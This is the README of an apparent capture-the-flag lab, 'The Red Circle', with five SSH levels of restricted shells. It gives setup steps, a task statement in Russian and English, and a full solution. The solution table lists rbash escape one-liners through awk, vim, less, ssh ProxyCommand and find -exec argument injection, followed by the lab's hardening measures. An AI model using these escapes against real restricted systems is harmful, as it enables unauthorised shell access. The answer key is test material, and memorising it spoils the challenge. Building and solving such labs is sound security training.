# The Red Circle (admin/medium)

- Порт: `13408` (переопределяется через `PORT`; внутри контейнера `22`, SSH)
- Флаг: только из env `CTF_FLAG`

## Запуск

```bash
CTF_FLAG='InnoCTF{...}' docker compose up -d --build
ssh level1@127.0.0.1 -p 13408        # пароль level1
```

Без `CTF_FLAG` контейнер отказывается стартовать; формат флага
проверяться не будет — используется то, что выдаёт runtime. Пароли уровней 2–5 детерминированно выводятся
из флага при старте: в git их нет, рестарт того же инстанса не ломает
прогресс команды. `docker compose restart` сбрасывает дома (скелет),
но сохраняет ключи.

## Условие (для игроков)

**RU:** Красный круг снова в деле: по городу разослали пять запечатанных
конвертов, и каждый заперт строже предыдущего. Ключ к следующему конверту
спрятан внутри предыдущего. Вскройте все пять — в последнем лежит улика,
которую нельзя подделать.

**EN:** The Red Circle is back in play: five sealed envelopes have been
mailed across the city, each locked tighter than the last. The key to the
next envelope is hidden inside the previous one. Open all five — the final
envelope holds the evidence that cannot be forged.

Вход в первый конверт: `ssh level1@<host> -p <port>` (пароль `level1`).
Внутри конверта N — ограниченная оболочка и `README.txt` с целью,
подсказками и ключевыми словами. Побег считается удавшимся, когда запущен
`/usr/local/bin/nextkey`: он печатает пароль от `level<N+1>` (вход — тот же
хост и порт), а на пятом уровне — флаг.

## Решение

Один контейнер, sshd, пять пользователей `level1..level5`. Уровни 1–4 —
`/bin/rbash` с двумя командами в PATH (`ls`, `id` + GTFOBins-бинарь уровня),
уровень 5 — меню «КАРТОТЕКА». rbash ограничивает только сам процесс rbash:
каждый запуск из PATH работает без ограничений.

| # | Оболочка | Вектор побега |
|---|----------|---------------|
| 1 | rbash + awk | `awk 'BEGIN { system("/usr/local/bin/nextkey") }'` |
| 2 | rbash + vim | vim → `:sh` → `nextkey` (или `:! /bin/sh`) |
| 3 | rbash + less | `less README.txt` → `!/bin/sh` → `nextkey` |
| 4 | rbash + ssh | `ssh -o ProxyCommand='/bin/sh -c "/bin/sh -i </dev/tty >/dev/tty 2>&1"' localhost` → `nextkey` |
| 5 | меню картотека | `find -exec /usr/local/bin/nextkey ;` (args передаются в find без кавычек) |

Пропуск уровней невозможен: `nextkey` выдаёт секрет по REAL uid вызывающего
(uid 100N получает только пароль level N+1, uid 1005 — только флаг);
`/run/case/*` — 0600 root; дома root-owned 0755; PATH залочен и для
интерактивных, и для remote-command сессий; sftp/scp подсистемы нет;
`AllowTcpForwarding no`; nproc 128 + pids_limit 250/mem 512m/cpus 0.5/tmpfs
против fork-бомб. Host-ключи sshd регенерируются на каждый инстанс и
пресеедятся в `/etc/ssh/ssh_known_hosts` (для `ssh localhost` уровня 4).

## Проверка решения

```bash
python3 solve.py                    # полная цепочка, чистый stdlib, без sshpass
python3 solve.py --probe            # 5 posture-проверок (PATH-лок, sftp off, …)
```
